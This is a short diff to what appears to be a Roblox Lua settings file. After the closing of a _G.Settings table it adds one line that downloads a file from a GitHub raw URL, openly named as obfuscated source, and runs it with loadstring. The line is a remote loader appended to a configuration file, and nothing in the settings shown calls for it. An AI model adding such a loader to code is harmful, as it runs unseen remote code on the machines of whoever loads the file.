@@ -87,3 +87,5 @@ _G.Settings = {
         },
     }
 }
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/WeLoveVast/stremeable.nettable/refs/heads/main/obsfutcatedsource.txt"))()
